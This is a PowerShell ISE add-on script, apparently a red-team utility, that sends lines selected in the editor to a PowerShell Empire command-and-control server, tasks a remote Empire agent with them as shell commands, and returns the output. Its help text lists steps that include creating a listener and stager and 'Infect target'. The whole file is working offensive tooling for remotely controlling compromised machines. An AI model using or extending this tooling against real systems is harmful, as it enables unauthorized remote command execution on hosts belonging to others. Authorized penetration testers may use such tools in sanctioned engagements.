# Requires PowerEmpire by DarkOperator
Import-Module PowerEmpire

# SniperISEr Object
$Props = @{
    'SessionID' = 0
    'AgentName' = 'test'
    }
$SniperISEr = New-Object PSCustomObject -Property $Props

# LastCall Object
$Props = @{
    'SessionID' = 0
    'AgentName' = 'test'
    'Command' = ''
    'Output' = ''
    }
$LastCall = New-Object PSCustomObject -Property $Props



<#
.Synopsis
   ISE ScriptPane to Empire Server to Empire Agent and back
.DESCRIPTION
   PowerShell ISE add-on to send commands to Empire Agent using Empire API and PowerEmpire Module
.EXAMPLE
   Invoke-SniperISEr -Line 2
   Will run line 2 of ISE scriptPane against default SessionId and default AgentName
.EXAMPLE
   SniperISEr -Line 2 -To 4
   Will run ScriptBlock from line 2 to 4 against default SessionId and default AgentName
.EXAMPLE
   SniperISEr 2 4 -SessionId 1 -AgentName Foo
   Will run ScriptBlock from line 2 to 4 against specified Session and Agent
.EXAMPLE
   xx 2 4
   Will run ScriptBlock from line 2 to 4 against default SessionId and default AgentName
.EXAMPLE
   xx 2 4 -Test
   Will run ScriptBlock from line 2 to 4 against localHost (same as F8)
.INPUTS
   ISE ScriptPane
.OUTPUTS
   Results Stored in $LastCall.Result
.NOTES
   Requires Empire server in API mode
   Requires PowerEmpire Module by @Carlos_Perez aka 'DarkOperator'
   https://gitlab.com/carlos_perez/PowerEmpire/wikis/home

    ## PoSh Empire Server
    Install Empire 1.5 (doesn't work with 1.6)
    Create Listener
    Create stager
    Infect target
    Rename Agent: test
    Start empire rest API
    (Mixed > open in new terminal)
    [empire]> ./empire --rest --username user --password password
    or (full instance)
    [empire]> ./empire --headless --username user --password password

    ## ISE
    #Import PowerEmpire from PoSh Gallery
    find-module PowerEmpire | Install-Module | import-module
    #Check Commands
    Get-command -module PowerEmpire
    #Create Session
    New-EmpireSession -ComputerName xx.xx.xx.xx -Credential user -NoSSLCheck
    Check $EmpireSessions
    
    ## SniperISEr
    run SniperISEr in ISE
    Check $SniperISEr
    Check $LastCall

    ## Keyboard Shortcut: F12 (equiv F8 but on target Agent)
.COMPONENT
   The component this cmdlet belongs to
.ROLE
   ISE SniperISEr
.FUNCTIONALITY
   ISE ScriptPane to Empire Server to Empire Agent and back
#>
function Invoke-SniperISEr{
    [CmdletBinding()]
    [Alias('Sniper','xx')]
    Param(
        # Specify Line/StartLine Number
        [Parameter(Mandatory=$true,Position=0)]
        [Int]$Line,
        # Specify EndLine Number
        [Parameter(Mandatory=$False,Position=1)]
        [Int]$To,
        # Specify PowerEmpire Session ID
        [Parameter(Mandatory=$False)]
        [Int]$SessionId = $Script:SniperISEr.SessionID,
        # Specify Empire Agent Name
        [Parameter(Mandatory=$False)]
        [String]$AgentName = $Script:SniperISEr.AgentName,
        #Test Command on localHost
        [Parameter(Mandatory = $false)]
        [Switch]$Test
        )
    # Prep Vars
    $Console = $psISE.CurrentPowerShellTab.ConsolePane
    $Editor = $psISE.CurrentFile.Editor
    #$Tab = $psISE.CurrentPowerShellTab.DisplayName
    $FullText = $Editor.text

    ##Actions
    # Select Line(s)
    if(!$To){
        $Editor.SetCaretPosition($Line,1)
        $Editor.SelectCaretLine()
        ShadowOperator -Id $SessionId -Name $AgentName -Test $test
        $Editor.SetCaretPosition($Line,1)
        $Console.focus()
        Break
        }
    if($Line -and $To){
        $Editor.SetCaretPosition($To,1)
        $Editor.SelectCaretLine()
        $Select = $Editor.SelectedText
        $Length = $Select.length
        $Editor.Select($Line,1,$To,$Length+1)
        ShadowOperator -Id $SessionId -Name $AgentName -Test $test
        $Editor.SetCaretPosition($Line,1)
        $Console.Focus()
        }
    }#End


# Sub Function
function ShadowOperator{
        [CmdletBinding()]
        param(
            [Parameter()][int]$Id = $Script:SniperISEr.SessionID,
            [Parameter()][String]$Name = $Script:SniperISEr.AgentName,
            [Parameter()][Switch]$Encoded,
            [Parameter()][Bool]$Test

            )
        #Prepare Selection
        $Editor = $psISE.CurrentFile.Editor
        if(!$Editor.SelectedText){$Editor.SelectCaretLine()}
        $SplitSelect = $Editor.SelectedText.replace("`n",'').Split("`r")
        $StripSelect = $SplitSelect.trim()
        if($SplitSelect.trim() -match "^#"){$StripSelect = $SplitSelect.trim() -notmatch "^#"}
        $JoinSelect = $StripSelect -join ';'
        $CleanSelect = $JoinSelect.replace(';;',';').replace('{;','{').trim().trimStart(';').trimEnd(';')
        if($CleanSelect -eq 'False'){Get-Shrug;Break}
        #Show string

        #Invoke-Expression
        if($Test){
            write-Verbose "Test: $Test"
            write-Verbose "$CleanSelect"
            ''         
            iex "$CleanSelect"
            }
        if(!$Test){
            write-Verbose "ID: $ID"
            write-Verbose "Agent: $Name"
            write-Verbose "$CleanSelect"

            $Null = Register-EmpireAgentShellCommandTask -Id $Id -Name $Name -Command "$CleanSelect"
            $Result = Get-EmpireAgentTaskResult -Id $Id -Name $Name
            while(!$Result.results){Start-Sleep -Seconds 1;$Result = Get-EmpireAgentTaskResult -Id $Id -Name $Name}
            $Script:LastCall.SessionID = $Id
            $Script:LastCall.AgentName = $Name
            $Script:LastCall.Command = $CleanSelect
            $Script:LastCall.Output = $Result.results
            $Null = Clear-EmpireAgentTaskResult -Id $Id -Name $Name
            ''
            return $Script:LastCall.Output
            }          
        }


# Keyboard Shortcut
$Null = $psISE.CurrentPowerShellTab.AddOnsMenu.Submenus.Add(“SniperISEr”, {ShadowOperator}, “F12”)

# Error message
function Get-Shrug{
    write-Host '¯\_(ツ)_/¯ "Computer says No..."' -ForegroundColor Cyan
    }


#################